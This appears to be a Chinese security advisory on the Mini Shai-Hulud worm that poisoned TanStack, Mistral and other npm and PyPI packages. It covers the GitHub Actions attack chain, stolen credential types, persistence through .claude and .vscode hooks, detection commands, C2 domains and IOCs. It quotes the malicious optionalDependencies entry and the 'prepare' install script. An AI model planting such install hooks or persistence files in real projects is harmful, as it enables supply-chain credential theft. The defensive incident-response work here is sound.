# Mini Shai-Hulud 蠕虫式投毒继续扩散，TanStack、Mistral、Squawk 等生态受影响，周下载量超千万

> 原文: https://www.ctfiot.com/307839.html
> ID: 307839

01.概述

2026 年 5 月 12 日凌晨 3 点，墨菲安全检测到 TanStack 由于 GitHub Actions 被攻击导致的 42 个 @tanstack/* npm 投毒包，恶意包在安装阶段执行约 2.3 MB 的混淆载荷，窃取 CI/CD、云平台和开发机凭据，并尝试利用拿到的发布权限继续污染维护者名下的其他包。

本次 Mini Shai-Hulud 活动已经继续扩散到 npm 和 PyPI，影响样本不只包含 TanStack，还包括 UiPath、Mistral AI、Squawk、OpenSearch、Guardrails AI 等包。对企业来说，这次事件的重点不只是“是否用了 TanStack”，而是需要排查开发机、CI runner、包发布流水线和 AI 开发工具配置是否已经接触过恶意版本。

图 1：TanStack 官方公告

02.

影响范围

TanStack 官方确认的直接范围是 42 个@tanstack/* 包、84 个恶意版本，@tanstack/react-router 这类包每周下载量超过千万级，常见 React、Solid、Vue 路由及 Start 相关包都出现在受影响列表中，重点样本包括：

生态

受影响样本

说明

npm / TanStack

@tanstack/react-router、@tanstack/router-core、@tanstack/router-cli、@tanstack/vue-router等

42 个包、84 个版本，主要集中在 Router / Start 相关包

npm / Mistral AI

@mistralai/mistralai、@mistralai/mistralai-azure、@mistralai/mistralai-gcp

AI 应用 SDK 被纳入攻击面，影响面不再只是前端工程

PyPI / Mistral AI

mistralai@2.4.6

说明活动已经跨到 Python 生态

npm / Squawk

@squawk/mcp、@squawk/weather、@squawk/flightplan等

多个航空数据和 MCP 相关包出现新增恶意版本

npm / OpenSearch

@opensearch-project/opensearch3.5.3、3.6.2、3.7.0、3.8.0

搜索基础设施客户端也进入受影响清单

PyPI / Guardrails AI

guardrails-ai@0.10.1

恶意逻辑在 import 时触发，下载并执行远程 Python artifact

npm / UiPath

多个@uipath/*包

企业自动化和工作流工具链相关包出现在清单中

TanStack 官方同时说明，@tanstack/query*、@tanstack/table*、@tanstack/form*、@tanstack/virtual*、@tanstack/store 等家族未列入此次 TanStack 影响范围。企业排查时不要只按 namespace 粗暴判断，要以具体包名、版本和锁文件为准。

03.

攻击链

TanStack 复盘中给出的关键点是：攻击者没有直接拿到 npm token，也没有控制官方发布工作流中的发布步骤，而是把三个条件串在了一起。

pull_request_target

工作流在 fork PR 上执行了不可信代码。

攻击者通过 GitHub Actions cache poisoning 把恶意内容写进会被主分支发布流程恢复的缓存。

发布流程具备写权限，恶意代码从 GitHub Actions runner 进程内存中提取 OIDC token，再直接向 npm registry 发起发布请求。

也就是说，恶意版本看起来仍然来自可信的 GitHub Actions/OIDC 发布链路。这一点比普通 maintainer token 泄漏更麻烦，因为安全团队不能只看“是否有 provenance / trusted publisher”就判定包安全。

在被污染的 npm 包里，可以看到两个典型注入点。

第一注入点

package.json 中新增的

optionalDependencies："optionalDependencies": { "@tanstack/setup":"github:
tanstack/router#79ac49eedf774dd4b0cfa308722bc463cfe5885c "}

这个 URL 看起来指向 TanStack/router，但对应 commit 实际来自 fork 网络中的孤立提交。该提交只引入了 package.json 和 tanstack_runner.js 两个文件。

第二注入点

二、恶意 @tanstack/setup 包中的生命周期脚本：

{"name":"@tanstack/setup","version":"1.0.0","scripts": { "prepare":"bun run tanstack_runner.js && exit 1" },"dependencies": { "bun":"^1.3.13" }}

恶意包根目录还会出现 router_init.js。公开分析显示该文件约 2.3 MB，单行、重度混淆，正常发布包中不应该包含这个根目录文件。以 @tanstack/router-generator 的一个对比样本为例，干净版本解包后约 867 KB，恶意版本解包后超过 3 MB，差异主要来自新增载荷。

图 2：恶意包中新增的 optionalDependencies 恶意Payload

恶意行为梳理

这批恶意版本的危害不止是读取环境变量，具体可分为以下几类：

多场景凭据窃取

CI/CD 环境：载荷会尝试读取 GitHub Actions runner 相关环境和内存中的凭据，包括 GitHub token、OIDC token、npm token、云平台访问密钥和仓库 secrets。即使 secret 在日志里被掩码，运行时内存中仍可能出现明文 。

云环境：它会访问 AWS EC2 IMDS、ECS/Fargate 任务元数据、Vault、Kubernetes ServiceAccount token 等位置，同时读取本地保存的 AWS、Azure、GCP、Terraform 等配置文件 。

开发机环境：它会寻找 SSH 私钥、.git-credentials、.npmrc、Docker 配置、.netrc、.pypirc、shell history、Kubernetes 配置、VPN 配置，以及 Claude / Kiro 等 AI 工具配置。终端历史里如果出现过 token、密码或云密钥，也可能被一起带走 。

持久化驻留

公开样本会入.claude/settings.json、.claude/router_runtime.js、.claude/setup.mjs、.vscode/tasks.json、.vscode/setup.mjs，利用 Claude Code hooks 和 VS Code task 在后续打开项目或使用工具时再次执行。部分样本还会落地 gh-token-monitor 相关 LaunchAgent、systemd user service 或本地脚本 。

蠕虫式跨生态传播

载荷拿到 npm token 或 OIDC 发布能力后，会枚举维护者名下其他包并继续发布带有同类注入的恶意版本。TanStack 之后 Mistral、Squawk、OpenSearch、Guardrails AI 等样本的出现，说明这类攻击已经从一个项目的发布链路问题，变成了跨维护者、跨生态的持续污染 。

此次事件影响面较大

攻击目标转移：从 “应用依赖” 转向 “发布链路”

恶意代码无需进入线上业务，仅需在 npm install、CI 构建、包发布流程中执行一次，即可窃取发布权限与云凭据 。

受信发布机制被恶意借用

Trusted Publishing、OIDC、SLSA provenance 仅能证明 “发布发生在可信流水线”，无法保障流水线运行期间未执行恶意代码。本次攻击正是利用了可信流水线的执行权限 。

开发工具成为持久化攻击入口

.claude/ 和 .vscode/ 并非传统 EDR 规则重点监控对象，但开发者每日都会使用相关工具。仅删除 node_modules 无法完成彻底清理 。

影响面扩展至AI与自动化工具链

Mistral、Guardrails AI、UiPath、Squawk、OpenSearch 等包受影响，说明排查范围需覆盖：

使用 AI SDK 的团队

使用 Python 包的团队

使用自动化平台客户端的团队

内部包发布流水线相关团队

上述团队均需按受影响版本和 IOC 开展全面核查 。

05.

排查方式

建议按“触点筛查、高置信 IOC、行为佐证”三层做。

查项目依赖和锁文件，确认是否接触过已知恶意包版本或恶意依赖 URL：

查依赖树里是否有恶意初始化文件：

检查 GitHub Actions 是否被注入导出 secrets 的工作流：

检查开发机和项目目录中的持久化文件：

检查 Git 痕迹：

检查运行中进程：

grep -RInE'@tanstack/setup|github:
tanstack/router#79ac49eedf774dd4b0cfa308722bc463cfe5885c' package*.json pnpm-lock.yaml yarn.lock bun.lock 2>/dev/null ||truefind node_modules -name'router_init.js'-typef 2>/dev/nullshasum -a 256 node_modules/**/router_init.js 2>/dev/null

如果命中以下 SHA256，应按已确认失陷处理：

ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266cgrep-RInE'toJSON(secrets)|api.masscan.cloud|filev2.getsession.org|format-results.txt|CodeQL Analysis' .github/workflows2>/dev/null|| truefind . -path'./.claude/settings.json'-o -path'./.vscode/tasks.json'-o -path'./.claude/router_runtime.js'-o -path'./.claude/setup.mjs'-o -path'./.vscode/setup.mjs'find ~/Library/LaunchAgents ~/.config/systemd/user ~/.local/bin ~/.config -name'*gh-token-monitor*'2>/dev/nullgitlog--all --author=claude@users.noreply.github.com --onelinegit branch -a |grep'dependabot/github_actions/format/'ps aux |grep-Ei'gh-token-monitor|tanstack_runner.js|router_runtime.js|bun'|grep-vgrep

如果使用 npm token，检查是否出现异常 token 描述：npm token list

重点关注是否有下面 token：

IfYouRevokeThisTokenItWillWipeTheComputerOfTheOwner

06.

判定口径

命中 router_init.js 恶意哈希、恶意依赖 URL、恶意工作流、持久化文件、可疑 Git 作者、运行中恶意进程中的任一项，按已确认失陷处理。

只命中受影响包版本，但没有发现更强 IOC，按高风险接触处理。因为恶意逻辑是在安装阶段执行，不能只看当前目录里是否还保留恶意文件。

当前未命中，不代表绝对安全。若 2026 年 5 月 11 日至 5 月 12 日期间 CI/CD 或开发机安装过相关版本，仍应检查流水线日志、npm 发布日志、GitHub Actions OIDC 使用记录和云平台审计日志。

07.

处置建议

已确认失陷的环境，先隔离开发机或 runner，不要在原机器上直接轮换凭据。凭据轮换应在干净环境中完成。

轮换优先级建议如下：

npm token、包发布权限、Trusted Publisher / OIDC 绑定。

GitHub PAT、GitHub App token、仓库和组织级 secrets。

AWS、GCP、Azure 静态密钥和临时凭据来源。

Vault token、Kubernetes ServiceAccount token。

SSH 私钥、Docker registry 凭据、.npmrc、.netrc、.pypirc。

清理项目时，不能只删 node_modules。还需要删除 .claude/、.vscode/ 中异常文件，检查用户目录里的 gh-token-monitor 持久化项，审计 GitHub Actions 工作流和近期提交。

CI/CD 侧建议立即收紧 OIDC 权限：

不需要发布的 workflow 设置：

permissions: id-token: none

需要发布的 job：

将 id-token: write 限定到最小范围

避免在 pullrequesttarget 上执行 fork 代码

避免恢复共享缓存

避免运行安装脚本

第三方 Actions 固定到 commit SHA，不要只固定 tag。

网络侧可以临时阻断：

filev2.getsession.org

seed1.getsession.org

api.masscan.cloud

git-tanstack.com

以下地址分别对应云元数据、ECS 任务元数据或本地 Vault，不适合当作普通外网 IOC 一刀切封禁，应结合进程、时间点和访问路径审计：

169.254.169.254

169.254.170.2

127.0.0.1:
8200

08.

IOC

恶意依赖

github:
tanstack/router#79ac49eedf774dd4b0cfa308722bc463cfe5885c@tanstack/setup

文件哈希：

router_init.js / router_runtime.jsSHA256: ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266ctanstack_runner.jsSHA256: 2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96@tanstack/setup package.jsonSHA256: 7c12d8614c624c70d6dd6fc2ee289332474abaa38f70ebe2cdef064923ca3a9b

C2 / 外联目标：

api.masscan.cloudfilev2.getsession.orggit-tanstack.comseed1.getsession.org

持久化路径：

.claude/settings.json.vscode/tasks.json.claude/router_runtime.js.claude/setup.mjs.vscode/setup.mjs~/Library/LaunchAgents/com.user.gh-token-monitor.plist~/.config/systemd/user/gh-token-monitor.service~/.local/bin/gh-token-monitor.sh~/.config/gh-token-monitor/

Git/CI 特征：

toJSON(secrets)format-results.txtCodeQL Analysisclaude@users.noreply.github.comchore: update dependenciesdependabot/github_actions/format/<dune-word>

09.

参考链接

https://tanstack.com/blog/npm-supply-chain-compromise-postmortem

https://github.com/TanStack/router/issues/7383

https://github.com/TanStack/router/security/advisories/GHSA-g7cv-rxg3-hmpx


```
optionalDependencies："optionalDependencies": { "@tanstack/setup":"github:
tanstack/router#79ac49eedf774dd4b0cfa308722bc463cfe5885c "}
{"name":"@tanstack/setup","version":"1.0.0","scripts": { "prepare":"bun run tanstack_runner.js && exit 1" },"dependencies": { "bun":"^1.3.13" }}
grep -RInE'@tanstack/setup|github:
tanstack/router#79ac49eedf774dd4b0cfa308722bc463cfe5885c' package*.json pnpm-lock.yaml yarn.lock bun.lock 2>/dev/null ||truefind node_modules -name'router_init.js'-typef 2>/dev/nullshasum -a 256 node_modules/**/router_init.js 2>/dev/null
ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266cgrep-RInE'toJSON(secrets)|api.masscan.cloud|filev2.getsession.org|format-results.txt|CodeQL Analysis' .github/workflows2>/dev/null|| truefind . -path'./.claude/settings.json'-o -path'./.vscode/tasks.json'-o -path'./.claude/router_runtime.js'-o -path'./.claude/setup.mjs'-o -path'./.vscode/setup.mjs'find ~/Library/LaunchAgents ~/.config/systemd/user ~/.local/bin ~/.config -name'*gh-token-monitor*'2>/dev/nullgitlog--all --author=claude@users.noreply.github.com --onelinegit branch -a |grep'dependabot/github_actions/format/'ps aux |grep-Ei'gh-token-monitor|tanstack_runner.js|router_runtime.js|bun'|grep-vgrep
IfYouRevokeThisTokenItWillWipeTheComputerOfTheOwner
permissions: id-token: none
github:
tanstack/router#79ac49eedf774dd4b0cfa308722bc463cfe5885c@tanstack/setup
router_init.js / router_runtime.jsSHA256: ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266ctanstack_runner.jsSHA256: 2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96@tanstack/setup package.jsonSHA256: 7c12d8614c624c70d6dd6fc2ee289332474abaa38f70ebe2cdef064923ca3a9b
api.masscan.cloudfilev2.getsession.orggit-tanstack.comseed1.getsession.org
.claude/settings.json.vscode/tasks.json.claude/router_runtime.js.claude/setup.mjs.vscode/setup.mjs~/Library/LaunchAgents/com.user.gh-token-monitor.plist~/.config/systemd/user/gh-token-monitor.service~/.local/bin/gh-token-monitor.sh~/.config/gh-token-monitor/
toJSON(secrets)format-results.txtCodeQL Analysisclaude@users.noreply.github.comchore: update dependenciesdependabot/github_actions/format/<dune-word>
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1778590472-wxsync-2026-05-7a162a0738a8a9a41f4500f18e12dbc5.webp)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1778590473-wxsync-2026-05-0f6339112b8ce3b84f6841dcf4fd5546.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1778590475-wxsync-2026-05-7a162a0738a8a9a41f4500f18e12dbc5.webp)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1778590477-wxsync-2026-05-7a162a0738a8a9a41f4500f18e12dbc5.webp)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1778590478-wxsync-2026-05-5bb3f80a5e6028169b4e80ec568be2a2.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1778590481-wxsync-2026-05-7a162a0738a8a9a41f4500f18e12dbc5.webp)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1778590482-wxsync-2026-05-7a162a0738a8a9a41f4500f18e12dbc5.webp)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1778590484-wxsync-2026-05-7a162a0738a8a9a41f4500f18e12dbc5.webp)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1778590485-wxsync-2026-05-7a162a0738a8a9a41f4500f18e12dbc5.webp)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1778590487-wxsync-2026-05-7a162a0738a8a9a41f4500f18e12dbc5.webp)